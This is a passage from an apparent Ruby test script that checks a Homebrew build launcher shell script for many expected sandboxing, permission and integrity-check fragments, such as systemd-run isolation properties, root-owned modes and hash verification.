          'install --force-bottle --ignore-dependencies "$BOTTLE"'
        ), "reviewed bottle verifier permits target dependency recursion")
  check(!bottle_builder.include?('$WORK_DIR/brew-install'),
        "reviewed bottle builder writes runner control logs through the Formula work directory")
  check(!bottle_builder.match?(/brew[^\n]*bottle[^\n]*(?:--merge|--write)/),
        "reviewed bottle builder lets Formula execution rewrite tap source")
  check(bottle_verifier.include?("homebrew_patched_launcher_snapshot_target_cellar_layout") &&
        bottle_verifier.include?("Formula test changed the planned target Cellar"),
        "reviewed bottle verifier does not reject implicit target Cellar changes")
  launcher = File.read(File.join(REPO_ROOT, "scripts/homebrew-patched-launcher.sh"))
  [
    "systemd-run", "--wait", "--collect", "--pipe",
    "homebrew_patched_launcher_snapshot_target_cellar_layout",
    "homebrew-patched-launcher: target Cellar is unavailable",
    "target Cellar rack is not a real directory",
    "target Cellar keg is not a real directory",
    'wasm32) sysroot="$sysroot_build_root/sysroot"',
    'wasm64) sysroot="$sysroot_build_root/sysroot64"',
    'sysroot build root must be a real directory',
    'sysroot must be a real directory containing a regular libc archive',
    'expected_sysroot=%q',
    'selected primary tap root must be a real directory',
    'taps_root="$HOMEBREW_PATCHED_OVERLAY/Library/Taps"',
    'active Homebrew repository tap storage must be a real directory',
    'selected primary tap root is not one canonical tapped checkout',
    '[ "$primary_tap_root" != "$HOMEBREW_KANDELO_PRIMARY_TAP_ROOT" ]',
    'expected_primary_tap=%q',
    'isolated primary tap root changed',
    'selected primary tap is writable',
    'target Formula can modify the selected primary tap',
    'HOMEBREW_KANDELO_SYSROOT:-}',
    'WASM_POSIX_SYSROOT:-}',
    'xtask_bin="${WASM_POSIX_XTASK_BIN:-}"',
    'Kandelo root must be one exact canonical checkout',
    'prepared program-index checker must be one exact regular executable',
    'prepared program-index checker is outside the exact Kandelo root',
    'program-index checker is not the prepared release xtask',
    '[ "$xtask_mode" != "555" ]',
    'prepared program-index checker has an unsafe mode',
    'prepared program-index checker is not single-linked',
    'prepared program-index checker is owned by the Formula user',
    'prepared program-index checker is writable by the Formula user',
    'homebrew_assert_tree_not_replaceable_by_user "$build_user" "$xtask_bin"',
    "xtask_state=\"$(/usr/bin/stat -c '%d:%i:%u:%g:%a:%h:%s' \"$xtask_bin\")\"",
    'xtask_sha256="$(/usr/bin/sha256sum "$xtask_bin")"',
    'expected_xtask=%q',
    'expected_xtask_state=%q',
    'expected_xtask_sha256=%q',
    'protected program-index checker changed or is inaccessible',
    'could not inspect protected checker mount',
    'protected checker mount is writable',
    'prepared program-index checker changed after isolation',
    'protected_xtask="$HOMEBREW_PATCHED_PROTECTED_DIR/xtask"',
    'install -o root -g root -m 0555 --',
    'could not stage the root-owned program-index checker',
    'HOMEBREW_PATCHED_PROTECTED_XTASK="$protected_xtask"',
    '[ -z "$HOMEBREW_PATCHED_PROTECTED_XTASK_STATE" ]',
    'homebrew_patched_launcher_verify_protected_xtask',
    'protected checker changed; preserving launcher state for inspection',
    'protected launcher state could not be removed; preserving cleanup state for retry',
    'source aliases could not be removed; preserving cleanup state for retry',
    'protected_xtask_state=%q',
    'root-owned program-index checker changed after isolation',
    '[ "${HOMEBREW_KANDELO_XTASK_BIN:-}" != "$expected_xtask" ]',
    'HOMEBREW_KANDELO_XTASK_BIN=$xtask_alias',
    'WASM_POSIX_XTASK_BIN=$xtask_alias',
    'homebrew_patched_launcher_tier2_schema()',
    '.kandelo-publisher-tier2-attestation.json 65536 "Tier-2 attestation"',
    'tap_recipe_isolation=1',
    'if [ "$tap_recipe_isolation" != "1" ]',
    'expected_tap_recipe_isolation=%q',
    'if [ "$expected_tap_recipe_isolation" = 1 ]; then',
    '[ -n "${WASM_POSIX_XTASK_BIN+x}" ]',
    '[ -n "${HOMEBREW_KANDELO_XTASK_BIN+x}" ]',
    'for forbidden_xtask in "$expected_xtask" "$expected_protected_xtask"',
    '[ -r "$forbidden_xtask" ]',
    'tap recipe retained program-index checker authority',
    'packages/registry local-binaries .ci-test-binary-cache',
    'scripts/install-local-binary.sh',
    'tap_recipe_inaccessible_paths=("-$xtask_alias")',
    '"-$source_alias_dir/kandelo/$tap_recipe_relative"',
    'target Brew launcher changed before isolation',
    '"$HOMEBREW_PATCHED_PREFIX/bin"',
    '"$HOMEBREW_PATCHED_PREFIX/etc"',
    '"$HOMEBREW_PATCHED_PREFIX/etc/homebrew"',
    'chown -h root:root "$HOMEBREW_PATCHED_LAUNCHER"',
    'could not protect mutable target Homebrew roots',
    '/usr/bin/find "$cellar" -xdev -mindepth 1 -type d',
    'homebrew_patched_launcher_prepare_platform_projection',
    'homebrew_patched_launcher_prepare_formula_test_runtime',
    'scripts/homebrew-tap-recipe-runner.py',
    'tools/bin/wasm-fork-instrument',
    'tools/bin/wasm-local-root-spill',
    'closed platform projection exposes undeclared authority',
    'homebrew_patched_launcher_verify_platform_projection',
    'homebrew_patched_launcher_verify_formula_test_runtime',
    'homebrew_patched_launcher_seal_target_dependencies',
    '"$jq_bin" -cSjn',
    'pkg_version: $a.tap_recipe.pkg_version',
    '"$sudo_bin" -n -- /usr/bin/tee "$config" >/dev/null',
    '"--property=InaccessiblePaths=$tap_recipe_path"',
    "--property=KillMode=control-group", "--property=SendSIGKILL=yes",
    "--property=NoNewPrivileges=yes", "--expand-environment=no",
    '"--property=BindReadOnlyPaths=$kandelo_projection:$kandelo_alias"',
    '"--property=BindReadOnlyPaths=$protected_xtask:$xtask_alias"',
    '"--property=BindReadOnlyPaths=$tap_root:$source_alias_dir/tap"',
    '"--property=BindReadOnlyPaths=$sysroot:$source_alias_dir/sysroot"',
    '"--property=BindReadOnlyPaths=$taps_root"',
    '"--property=InaccessiblePaths=$kandelo_root"',
    '"--property=InaccessiblePaths=$tap_root"',
    '"--property=InaccessiblePaths=$output_root"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_FORMULA_TEST_ROOT"',
    '"--property=InaccessiblePaths=$sysroot_build_root"',
    '"--uid=$build_user"', '"--gid=$build_group"',
    'env_bin="$(command -v env)"',
    'printf \' --working-directory="$working_directory" -- %q -i\'',
    'printf \'bottle_tag_env=()\\n\'',
    'for variable in KANDELO_HOMEBREW_BOTTLE_TAG HOMEBREW_KANDELO_BOTTLE_TAG',
    'bottle_tag_env+=("%s=${%s}")',
    'HOMEBREW_KANDELO_ROOT=$source_alias_dir/kandelo',
    'KANDELO_HOMEBREW_KANDELO_ROOT=$source_alias_dir/kandelo',
    'HOMEBREW_KANDELO_SYSROOT=$source_alias_dir/sysroot',
    'WASM_POSIX_SYSROOT=$source_alias_dir/sysroot',
    'HOMEBREW_KANDELO_FORK_INSTRUMENT=$source_alias_dir/kandelo/tools/bin/wasm-fork-instrument',
    'HOMEBREW_KANDELO_LOCAL_ROOT_SPILL=$source_alias_dir/kandelo/tools/bin/wasm-local-root-spill',
    'printf \' "${bottle_tag_env[@]}" "${formula_test_env[@]}" "$command_path" "$@")\\n\'',
    "__kandelo_verify_source_aliases", "/usr/bin/findmnt",
    'source_audit_failed "$?" "$LINENO" "$BASH_COMMAND"',
    'if [ "$source_audit" = 1 ]; then collect_args=(); fi',
    'status "$unit" --no-pager --lines=20 >&2 || true',
    'reset-failed "$unit"',
    '"$sudo_bin" install -o root -g root -m 0555 "$wrapper_source" "$wrapper_path"',
    '/usr/bin/find "$config_root" -xdev -type d',
    '/usr/bin/find "$config_root" -xdev -type f',
    '-exec chmod 0555 {} +',
    '-exec chmod 0444 {} +',
    'trust_file="$XDG_CONFIG_HOME/homebrew/trust.json"',
    'trust_lock="${trust_file}.lock"',
    '"0:0:444:1"',
    'trust-store files must use distinct private inodes',
    'isolated trust-store access is unsafe',
    'homebrew_patched_launcher_seed_bundler_groups',
    'install-bundler-gems --groups="$groups_csv"',
    '.homebrew_gem_groups', '.homebrew_vendor_version',
    'Bundler groups must be unique',
    'cannot seed Bundler groups after isolation',
    'homebrew_assert_tree_symlinks_contained "$sysroot" sysroot',
    'homebrew_assert_tree_not_replaceable_by_user "$build_user" "$sysroot"',
    '"$build_user" "$HOMEBREW_KANDELO_GNU_TAR"',
    '"$HOMEBREW_KANDELO_GNU_TAR" "Nix GNU tar" || return',
    'homebrew_assert_tree_not_replaceable_by_user \
      "$build_user" "$HOMEBREW_KANDELO_GNU_TAR" || return',
    'sysroot_access_violation="$(/usr/bin/find "$expected_sysroot" -xdev',
    'protected sysroot alias has unsafe access',
    'sysroot build root cannot be inside mutable Formula state',
    'mutable Formula state cannot be inside the sysroot build root',
    'homebrew_patched_launcher_seal_overlay',
    'homebrew_patched_launcher_assert_overlay_symlinks_contained',
    'overlay symlink crosses its worktree',
    'overlay symlink escapes its worktree',
    '/usr/bin/realpath -m -s -- "$lexical_input"',
    '/usr/bin/realpath -- "$link"',
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealing"',
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="sealed"',
    'homebrew_patched_launcher_verify_overlay_seal',
    'homebrew_patched_launcher_restore_overlay_for_cleanup',
    'homebrew_patched_launcher_worktree_registration_status',
    'worktree list --porcelain',
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE="cleanup-ready"',
    '"$HOMEBREW_PATCHED_OVERLAY" -xdev -type f -perm /0111',
    '-exec /usr/bin/chmod 0444 {} +',
    'refusing to restore the overlay before Formula process teardown',
    'Homebrew overlay registration could not be verified; preserving launcher state for retry',
    'Homebrew overlay removal failed; preserving launcher state for retry',
    'EXTRA_PATCH_FILE',
    'git -C "$HOMEBREW_PATCHED_OVERLAY" apply --check "$extra_patch_file"',
    "-writable -print -quit", "! -readable -o ! -executable", "-prune",
    "homebrew_patched_launcher_uid_has_processes", "homebrew_patched_launcher_teardown",
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- "$HOMEBREW_PATCHED_PGREP_BIN"',
    '-KILL -u "$HOMEBREW_PATCHED_BUILD_UID"',
    "could not inspect isolated build processes",
    "Formula build identity still owns live processes",
    "homebrew_patched_launcher_native_prefix_path",
    "native prefix base leaves no room for an exact Linuxbrew relocation path",
    "homebrew_patched_launcher_prepare_native_prefix",
    "expected PREFIX CACHE TEMP CONFIG HOME",
    "homebrew_patched_launcher_set_native_api_source",
    "native API source must be selected once before isolation",
    "native API source root is not sealed",
    "native API source contains an unsafe entry",
    "native API source changed before isolation",
    "native API source is inside mutable native state",
    "mutable native state is inside the API source",
    "native API mountpoint is not empty",
    "native API mountpoint is replaceable",
    "homebrew_patched_launcher_stage_native_contract_file",
    "native contract source exceeds its size limit",
    "native contract destination already exists",
    "staged native contract file changed",
    'HOMEBREW_PATCHED_NATIVE_CONTRACT_DIR="$HOMEBREW_PATCHED_PROTECTED_DIR/native-api"',
    '"--property=BindReadOnlyPaths=$HOMEBREW_PATCHED_NATIVE_API_SOURCE:$HOMEBREW_PATCHED_NATIVE_CACHE/api"',
    'native_inputs=("$native_prefix" "$native_cache" "$native_temp" "$native_config" "$native_home")',
    'chmod 0700 "$path"',
    'HOME="$HOMEBREW_PATCHED_NATIVE_HOME"',
    '/home/linuxbrew/.linuxbrew/Cellar',
    'must exactly match fixed-prefix Linuxbrew bottle path lengths',
    'HOMEBREW_RELOCATE_BUILD_PREFIX=1',
    '"--property=BindReadOnlyPaths=$HOMEBREW_PATCHED_NATIVE_PREFIX"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_CACHE"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_TEMP"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_CONFIG"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_NATIVE_HOME"',
    '"--property=BindReadOnlyPaths=$work_dir"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_PREFIX"',
    '"--property=InaccessiblePaths=$HOMEBREW_CACHE"',
    '"--property=InaccessiblePaths=$HOMEBREW_TEMP"',
    '"--property=InaccessiblePaths=$XDG_CONFIG_HOME"',
    '"--property=InaccessiblePaths=$build_home"',
    '"$sudo_bin" /usr/bin/install -o root -g root -m 0500',
    '/usr/bin/realpath -- "$current"',
    'homebrew_patched_launcher_seal_native_prefix',
    'homebrew_patched_launcher_audit_native_projection_links',
    '--audit-native-links',
    '/usr/bin/chown -hR root:root',
    '-type d -exec /usr/bin/chmod 0555 {} +',
    "-type f -perm /0111 \\\n      -exec /usr/bin/chmod 0555 {} +",
    "-type f ! -perm /0111 \\\n      -exec /usr/bin/chmod 0444 {} +",
    'homebrew_patched_launcher_bridge_native_formula',
    'homebrew_patched_launcher_rewrite_native_bridge_links',
    'native Formula cross-keg link is unresolved',
    '"$rm_bin" -f -- "$target_link"',
    '"$ln_bin" -s -- "$resolved" "$target_link"',
    'homebrew_patched_launcher_remove_native_bridges',
    'HOMEBREW_PATCHED_NATIVE_BRIDGE_NAMES+=("$formula")',
    'native Formula bridge creation failed; rolling back',
    'native Formula bridge rollback failed; preserving launcher state for retry',
    'Formula process teardown failed; preserving launcher state for retry',
    'return "$teardown_status"',
    'for protected_bin in chmod chown cmp cp id install ln ls mktemp mv readlink rm \\',
    'od sha256sum stat test tr; do',
    '"$sudo_bin" /usr/bin/install -d -o root -g "$build_group" -m 1775',
    '"$(/usr/bin/stat -c \'%u:%g:%a\' "$target_state_root")" = "0:$build_gid:1775"',
    'target_opt_target="../Cellar/$formula/$native_version"',
    '"$native_opt_target/." "$target_keg/"',
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/cp -R -p',
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/chown -hR root:root',
    '"$target_rack" -xdev -type d -exec /usr/bin/chmod 0555 {} +',
    '[ ! -d "$target_keg" ] || [ -L "$target_keg" ]',
    'native Formula has a symlink that cannot be safely relocated',
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- /usr/bin/ln -s',
  ].each do |fragment|
    check(launcher.include?(fragment), "isolated Brew launcher lacks #{fragment}")
  end
  target_cellar_link_contract = launcher[
    /homebrew_patched_launcher_assert_target_cellar_links_safe\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_seal_target_dependencies/m,
    1
  ]
  check(target_cellar_link_contract,
        "isolated Brew launcher lost its target-Cellar link contract")
  [
    'for formula in "${HOMEBREW_PATCHED_NATIVE_BRIDGE_NAMES[@]}"; do',
    '[ "$HOMEBREW_PATCHED_NATIVE_SEALED" = "1" ]',
    'native_opt="$HOMEBREW_PATCHED_NATIVE_PREFIX/opt/$formula"',
    '[ "${native_opt_target%/*}" = "$native_rack" ]',
    'target_keg="$target_rack/$native_version"',
    '[ "$(cd "$target_keg" && pwd -P)" = "$target_keg" ]',
    '[ "$(/usr/bin/readlink "$target_opt_link")" = "$expected_opt_target" ]',
    'homebrew_assert_tree_not_writable_by_user "$build_user" "$target_rack"',
    'homebrew_assert_tree_not_replaceable_by_user "$build_user" "$target_rack"',
    'homebrew_patched_launcher_audit_native_projection_links',
    '--only-additional-trees "$target_keg"',
    'audited_bridge_kegs+=("$target_keg")',
    '/usr/bin/find "$physical_cellar" -xdev -type l',
    'audited_trees=("${@:1:audited_count}")',
    '"$audited_tree"|"$audited_tree"/*)',
    '/usr/bin/realpath -m -s -- "$lexical_input"',
    '/usr/bin/realpath -- "$link"',
  ].each do |fragment|
    check(target_cellar_link_contract.include?(fragment),
          "target-Cellar link contract lacks #{fragment}")
  end
  target_dependency_seal_contract = launcher[
    /homebrew_patched_launcher_seal_target_dependencies\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_snapshot_target_cellar_layout/m,
    1
  ]
  check(
    target_dependency_seal_contract&.include?(
      "homebrew_patched_launcher_assert_target_cellar_links_safe"
    ) && target_dependency_seal_contract.include?(
      '"$build_user" "$cellar" || return'
    ), "target dependency sealing bypasses its composed link contract"
  )
  overlay_integrity_contract = launcher[
    /homebrew_patched_launcher_integrity\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_verify_protected_xtask/m,
    1
  ]
  check(overlay_integrity_contract,
        "isolated Brew launcher lost its sealed-overlay integrity contract")
  [
    'git_path="${HOMEBREW_GIT_PATH:-}"',
    "set -o pipefail",
    'GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null',
    'GIT_NO_REPLACE_OBJECTS=1 GIT_OPTIONAL_LOCKS=0',
    'diff --no-ext-diff --binary HEAD &&',
    'status --porcelain=v1 --untracked-files=all',
  ].each do |fragment|
    check(overlay_integrity_contract.include?(fragment),
          "sealed-overlay integrity contract lacks #{fragment}")
  end
  check(!overlay_integrity_contract.match?(/\n\s+git -C /),
        "sealed-overlay integrity contract can use an ambient Git executable")
  native_overlay_attestation_verifier = launcher[
    /homebrew_patched_launcher_verify_native_overlay_attestation\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_stage_native_overlay_attestation/m,
    1
  ]
  check(native_overlay_attestation_verifier,
        "isolated Brew launcher lost its native overlay attestation verifier")
  [
    'HOMEBREW_PATCHED_NATIVE_OVERLAY_ATTESTATION_STATE',
    'HOMEBREW_PATCHED_NATIVE_OVERLAY_ATTESTATION_SHA256',
    'native-overlay-attestation.json',
    "/usr/bin/stat -c '%d:%i:%u:%g:%a:%h:%s'",
    "/usr/bin/sha256sum",
    'homebrew_patched_launcher_integrity 2>/dev/null',
    '"$actual_integrity" != "$HOMEBREW_PATCHED_INTEGRITY_SHA256"',
    "sealed Homebrew identity attestation changed",
  ].each do |fragment|
    check(native_overlay_attestation_verifier.include?(fragment),
          "native overlay attestation verification lacks #{fragment}")
  end
  native_overlay_attestation_stager = launcher[
    /homebrew_patched_launcher_stage_native_overlay_attestation\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_run_native/m,
    1
  ]
  check(native_overlay_attestation_stager,
        "isolated Brew launcher lost trusted native overlay attestation staging")
  trusted_overlay_git = launcher[
    /# Capture Git identity while the trusted workflow user still owns the\n(.*?)\n  # Git still needs the workflow-owned backing repository/m,
    1
  ]
  check(trusted_overlay_git,
        "isolated Brew launcher lost its pre-seal overlay identity capture")
  [
    'GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null',
    'GIT_NO_REPLACE_OBJECTS=1 GIT_OPTIONAL_LOCKS=0',
    "rev-parse --verify 'HEAD^{commit}'",
    "rev-parse --verify 'HEAD^{tree}'",
    '[[ "$overlay_commit" =~ ^[0-9a-f]{40}$ ]]',
    '[[ "$overlay_tree" =~ ^[0-9a-f]{40}$ ]]',
  ].each do |fragment|
    check(trusted_overlay_git.include?(fragment),
          "trusted pre-seal Homebrew identity capture lacks #{fragment}")
  end
  check(!trusted_overlay_git.include?("safe.directory"),
        "trusted pre-seal identity capture adds unnecessary Git ownership trust")
  [
    'HOMEBREW_PATCHED_OVERLAY_SEAL_STATE" != "sealed',
    'HOMEBREW_PATCHED_INTEGRITY_SHA256',
    'local commit="$4" tree="$5"',
    'schema: 1',
    'kind: "kandelo-homebrew-native-overlay-attestation"',
    'homebrew_commit: $commit',
    'homebrew_tree: $tree',
    'overlay_state_sha256: $integrity',
    'repository: $repository',
    'native-overlay-attestation.json',
    '-o root -g root -m 0444',
    '"0:0:444:1"',
    'HOMEBREW_PATCHED_NATIVE_OVERLAY_ATTESTATION="$destination"',
    'HOMEBREW_PATCHED_NATIVE_OVERLAY_ATTESTATION_STATE=',
    'HOMEBREW_PATCHED_NATIVE_OVERLAY_ATTESTATION_SHA256="$destination_sha"',
    'homebrew_patched_launcher_verify_native_overlay_attestation',
  ].each do |fragment|
    check(native_overlay_attestation_stager.include?(fragment),
          "trusted native overlay attestation staging lacks #{fragment}")
  end
  check(!native_overlay_attestation_stager.include?("safe.directory"),
        "sealed overlay attestation staging relies on cross-owner safe.directory")
  [
    'if [ -n "$HOMEBREW_PATCHED_NATIVE_API_SOURCE" ] ||',
    '[ "$tap_recipe_isolation" = "1" ]; then',
    'jq_bin="$(command -v jq)"',
    '"$build_user" "$jq_bin" "$jq_bin" jq || return',
  ].each do |fragment|
    check(launcher.include?(fragment),
          "native overlay attestation JSON writer lacks #{fragment}")
  end
  protected_executable_contract = launcher[
    /homebrew_assert_protected_host_executable\(\) \{\n(.*?)\n\}\n\nhomebrew_assert_protected_host_versioned_executable\(\)/m,
    1
  ]
  check(protected_executable_contract,
        "isolated Brew launcher lost its protected host executable contract")
  [
    %q([ "$(/usr/bin/stat -c '%u' "$path" 2>/dev/null || true)" != "0" ]),
    %q([ "$(/usr/bin/stat -c '%u' "$parent" 2>/dev/null || true)" != "0" ]),
    %q([ $((8#$parent_mode & 0022)) -ne 0 ]),
    %q("$HOMEBREW_PATCHED_SUDO_BIN" -H -u "$user" -- /usr/bin/test -w "$parent"),
    %q([ "$(/usr/bin/stat -Lc '%u' "$resolved" 2>/dev/null || true)" != "0" ]),
    %q([ $((8#$mode & 0022)) -ne 0 ]),
    %q("$HOMEBREW_PATCHED_SUDO_BIN" -H -u "$user" -- /usr/bin/test -w "$path"),
  ].each do |fragment|
    check(protected_executable_contract.include?(fragment),
          "protected host executable contract lacks #{fragment}")
  end
  versioned_executable_contract = launcher[
    /homebrew_assert_protected_host_versioned_executable\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_remove_native_bridges\(\)/m,
    1
  ]
  check(versioned_executable_contract,
        "isolated Brew launcher lost its protected version-selector contract")
  [
    '[ "$path" != "$expected" ]',
    '[ "${expected##*/}" != "$selector_name" ]',
    '! [[ "$selector_name" =~ ^[A-Za-z0-9_+-]+$ ]]',
    '[ ! -L "$path" ]',
    'resolved="$(/usr/bin/readlink -f -- "$path" 2>/dev/null || true)"',
    'expected_parent="${expected%/*}"',
    'resolved_parent="${resolved%/*}"',
    'resolved_basename="${resolved##*/}"',
    '[ "$resolved_parent" != "$expected_parent" ]',
    '! [[ "$resolved_basename" =~ ^${selector_name}\.[0-9]+$ ]]',
    'homebrew_assert_protected_host_executable',
    '"$user" "$path" "$expected" "$label" "$resolved"',
  ].each do |fragment|
    check(versioned_executable_contract.include?(fragment),
          "protected version-selector contract lacks #{fragment}")
  end
  strict_host_tool_loop = launcher[
    /for protected_bin in chmod chown cmp cp id install ln ls mktemp mv readlink rm \\\n    od sha256sum stat test tr; do.*?\n  done/m
  ]
  check(strict_host_tool_loop && !strict_host_tool_loop.include?("python3"),
        "Python remains routed through the regular-only protected host tool loop")
  check(launcher.include?(
          "homebrew_assert_protected_host_versioned_executable \\\n" \
          '    "$build_user" /usr/bin/python3 /usr/bin/python3 python3 python3'
        ), "isolated Brew launcher does not route Python through its protected selector")
  recipe_runner_source_contract = launcher[
    /homebrew_patched_launcher_admit_recipe_runner_source\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_prepare_recipe_runner\(\)/m,
    1
  ]
  check(recipe_runner_source_contract,
        "isolated Brew launcher lost privileged recipe-runner source admission")
  [
    'local source="$platform_root/scripts/homebrew-tap-recipe-runner.py"',
    '[ "$platform_root" != "$HOMEBREW_PATCHED_PLATFORM_ROOT" ]',
    'homebrew_patched_launcher_verify_platform_projection',
    '[ ! -f "$source" ]',
    '[ -L "$source" ]',
    '/usr/bin/stat -c \'%u:%g:%a:%h\' "$source"',
    '"0:0:444:1"',
    'source_sha="$(/usr/bin/sha256sum "$source" 2>/dev/null || true)"',
    '[[ "$source_sha" =~ ^[0-9a-f]{64}$ ]]',
  ].each do |fragment|
    check(recipe_runner_source_contract.include?(fragment),
          "privileged recipe-runner source admission lacks #{fragment}")
  end
  recipe_runner_prepare_contract = launcher[
    /homebrew_patched_launcher_prepare_recipe_runner\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_prepare_platform_projection\(\)/m,
    1
  ]
  check(recipe_runner_prepare_contract,
        "isolated Brew launcher lost privileged recipe-runner staging")
  [
    'homebrew_patched_launcher_admit_recipe_runner_source "$platform_host_root"',
    "runner_source_state=",
    "runner_source_sha=",
    '[ ! -e "$runner" ]',
    '[ ! -L "$runner" ]',
    '"$runner_source" "$runner"',
    "runner_source_state_after=",
    "runner_source_sha_after=",
    '[ "$runner_source_state_after" != "$runner_source_state" ]',
    '[ "$runner_source_sha_after" != "$runner_source_sha" ]',
    '[ "$runner_sha" != "$runner_source_sha" ]',
    %q([ "$(/usr/bin/stat -c '%u:%g:%a:%h' "$runner")" != "0:0:555:1" ]),
    '! /usr/bin/cmp -s -- "$runner_source" "$runner"',
    'trusted tap recipe runner changed while it was staged',
    '[ "$runner_sha_after" != "$runner_sha" ]',
    '"--property=ProtectHome=tmpfs"',
    '"--property=BindPaths=$allowed_request_root"',
    '"--property=ReadWritePaths=$allowed_request_root"',
    '"--property=BindReadOnlyPaths=$HOMEBREW_PATCHED_NATIVE_PREFIX/Cellar"',
    '"--property=BindReadOnlyPaths=$HOMEBREW_PATCHED_PREFIX/Cellar"',
    '--arg native_closure_manifest "$native_closure"',
  ].each do |fragment|
    check(recipe_runner_prepare_contract.include?(fragment),
          "privileged recipe-runner staging lacks #{fragment}")
  end
  check(!recipe_runner_prepare_contract.include?('"--property=ProtectHome=yes"'),
        "recipe supervisor masks its explicitly bound Homebrew roots")
  check(!recipe_runner_prepare_contract.include?("kandelo_root"),
        "privileged recipe-runner staging still accepts a second checkout authority")
  formula_test_manifest_contract = launcher[
    /homebrew_patched_launcher_formula_test_runtime_manifest\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_verify_formula_test_runtime\(\)/m,
    1
  ]
  check(formula_test_manifest_contract,
        "isolated Brew launcher lost the closed Formula-test runtime manifest")
  [
    "Cargo.toml",
    "package.json",
    "examples/run-example.ts",
    "host/src/binary-resolver.ts",
    "host/src/node-kernel-host.ts",
    "host/wasm/kandelo-kernel.wasm",
    "node_modules/tsx/package.json",
    "node_modules/esbuild/package.json",
    "apps/browser-demos",
    "node_modules/playwright/package.json",
    "node_modules/playwright-core/package.json",
    "node_modules/.bin/vite",
    "../vite/bin/vite.js",
    "node_modules/vite/bin/vite.js",
    "Formula test runtime apps tree contains undeclared state",
    ".ci-test-binary-cache/programs",
    "package-lock.json packages local-binaries",
    "tools/xtask scripts/dev-shell.sh",
    "scripts/install-local-binary.sh",
    '[[ "$HOMEBREW_PATCHED_FORMULA_TEST_XTASK_RELATIVE" =~ ^target/',
    "homebrew_assert_tree_symlinks_contained",
    "homebrew_patched_launcher_sysroot_projection_manifest",
  ].each do |fragment|
    check(formula_test_manifest_contract.include?(fragment),
          "Formula-test runtime manifest lacks #{fragment}")
  end
  formula_test_prepare_contract = launcher[
    /homebrew_patched_launcher_prepare_formula_test_runtime\(\) \{\n(.*?)\n\}\n\nhomebrew_patched_launcher_prepare_sysroot_projection\(\)/m,
    1
  ]
  check(formula_test_prepare_contract,
        "isolated Brew launcher lost privileged Formula-test runtime staging")
  [
    'homebrew_patched_launcher_admit_recipe_runner_source "$platform_root"',
    '"$admitted_runner" "$stager"',
    '[ "$runner_sha" != "$admitted_sha" ]',
    '! /usr/bin/cmp -s -- "$admitted_runner" "$stager"',
    "--stage-formula-test-runtime",
    '--source "$kandelo_root"',
    '--platform "$platform_root"',
    '--checker "$checker"',
    '--checker-relative "$checker_relative"',
    '--program-index "$program_index"',
    '--destination "$destination"',
    '/usr/bin/rm -f -- "$stager"',
    "homebrew_patched_launcher_formula_test_runtime_manifest",
    'HOMEBREW_PATCHED_FORMULA_TEST_ROOT="$destination"',
    'HOMEBREW_PATCHED_FORMULA_TEST_SHA256="$digest"',
  ].each do |fragment|
    check(formula_test_prepare_contract.include?(fragment),
          "privileged Formula-test runtime staging lacks #{fragment}")
  end
  [
    'kandelo_projection="$platform_projection"',
    'if [ "$source_audit" = 0 ] && [ "${1:-}" = test ]; then',
    'kandelo_projection="$formula_test_projection"',
    "HOMEBREW_KANDELO_XTASK_BIN=$xtask_alias",
    "WASM_POSIX_XTASK_BIN=$xtask_alias",
    'if [ "$formula_test" != 1 ]; then',
    '"--property=BindReadOnlyPaths=$kandelo_projection:$kandelo_alias"',
    '"--property=InaccessiblePaths=$protected_xtask"',
    '"--property=InaccessiblePaths=$platform_source_root"',
    '"--property=InaccessiblePaths=$HOMEBREW_PATCHED_FORMULA_TEST_ROOT"',
    '"${formula_test_env[@]}"',
  ].each do |fragment|
    check(launcher.include?(fragment),
          "Formula-test command scoping lacks #{fragment}")
  end
  check(!launcher.include?("NODE_PATH"),
        "Formula-test runtime reopens ambient Node module lookup through NODE_PATH")
  native_closure_handoff_contract = launcher[
    /homebrew_patched_launcher_seal_native_prefix\(\) \{\n(.*?)\n\}\n\n# Preserve relative links/m,
    1
  ]
  check(native_closure_handoff_contract,
        "isolated Brew launcher lost the sealed native closure handoff")
  [
    'homebrew_assert_tree_not_replaceable_by_user',
    '"$HOMEBREW_PATCHED_RECIPE_RUNNER"',
    "--stage-native-closure",
    '--source "$HOMEBREW_PATCHED_NATIVE_PREFIX/Cellar"',
    '--destination "$HOMEBREW_PATCHED_RECIPE_NATIVE_CLOSURE"',
  ].each do |fragment|
    check(native_closure_handoff_contract.include?(fragment),
          "sealed native closure handoff lacks #{fragment}")
  end
  check(launcher.include?(
          '"$build_user" "$build_group" "$recipe_user" "$primary_tap_root" \\' \
          "\n      \"$platform_source_root\" \\\n"
        ), "privileged recipe runner is not sourced from the sealed platform projection")
  check(!launcher.include?('homebrew_assert_tree_not_writable_by_user "$build_user" "$sysroot"'),
        "isolated Brew launcher requires pre-bind access to the protected sysroot owner path")
  check(launcher.scan("homebrew_patched_launcher_emit_sysroot_access_audit").length == 2,
        "isolated Brew launcher does not emit its reviewed sysroot alias audit exactly once")
  check(launcher.include?(
          "homebrew_patched_launcher_isolate: expected BUILD_USER WORK_DIR " \
          "KANDELO_ROOT TAP_ROOT OUTPUT_ROOT SYSROOT_BUILD_ROOT"
